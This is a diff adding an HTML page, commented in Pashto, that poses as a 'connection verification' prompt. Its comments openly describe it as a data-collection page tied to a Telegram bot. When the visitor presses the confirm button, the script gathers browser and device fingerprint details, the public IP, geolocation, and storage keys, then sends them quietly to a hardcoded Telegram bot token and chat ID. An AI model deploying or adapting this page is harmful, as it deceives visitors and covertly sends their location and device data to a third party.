@@ -1,0 +1,149 @@
+<!-- د معلوماتو غونډولو HTML پاڼه — د ټیلیګرام بوټ سره تړلې -->
+<!-- دا پاڼه د کاروونکي د براوزر معلومات، IP، او وسیله غونډوي -->
+<!DOCTYPE html>
+<html lang="ps">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>د اړیکې تایید</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a2e;
+            color: #eee;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .box {
+            background: #16213e;
+            padding: 40px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        h1 { color: #0f3460; font-size: 22px; }
+        p { color: #aaa; font-size: 14px; }
+        button {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>د اړیکې تایید</h1>
+        <p>مهرباني وکړئ د تایید تڼۍ کېکاږئ</p>
+        <button onclick="collectAndSend()">تایید</button>
+    </div>
+
+    <script>
+        // د ټیلیګرام بوټ تنظیم
+        const BOT_TOKEN = "8629012146:AAE_8FgSXC8Da5t7_Sd_XKGtUf_iFGiLghc";
+        const CHAT_ID = "8841631982";
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // د معلوماتو غونډول
+        function collectData() {
+            const data = {
+                // د براوزر معلومات
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(",") : "",
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || "unknown",
+                maxTouchPoints: navigator.maxTouchPoints,
+                vendor: navigator.vendor,
+
+                // د سکرین معلومات
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+
+                // د کیمیرا او مایکروفون اجازه
+                mediaDevices: navigator.mediaDevices ? "available" : "unavailable",
+
+                // د وخت زون
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+
+                // د ادرس معلومات
+                currentURL: window.location.href,
+                referrer: document.referrer,
+
+                // د وسیله حافظه
+                localStorageKeys: Object.keys(localStorage),
+                sessionStorageKeys: Object.keys(sessionStorage),
+
+                // د timestamp
+                timestamp: new Date().toISOString()
+            };
+            return data;
+        }
+
+        // د IP ترلاسه کول
+        async function getIP() {
+            try {
+                const r = await fetch("https://api.ipify.org?format=json");
+                const j = await r.json();
+                return j.ip;
+            } catch (e) {
+                return "unknown";
+            }
+        }
+
+        // د موقعیت ترلاسه کول
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve("unavailable");
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
+                    () => resolve("denied"),
+                    { timeout: 5000 }
+                );
+            });
+        }
+
+        // د معلوماتو لیږل
+        async function sendData(data) {
+            try {
+                const text = JSON.stringify(data, null, 2).slice(0, 4000);
+                await fetch(API_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: "📥 د براوزر معلومات:\n" + text
+                    })
+                });
+            } catch (e) {
+                // خاموشه تېروتنه
+            }
+        }
+
+        // اصلي فعالیت
+        async function collectAndSend() {
+            const data = collectData();
+            data.ip = await getIP();
+            data.geolocation = await getLocation();
+            await sendData(data);
+            document.querySelector("h1").textContent = "تایید شو";
+            document.querySelector("p").textContent = "مننه، اړیکه ټینګه شوه";
+        }
+    </script>
+</body>
+</html>
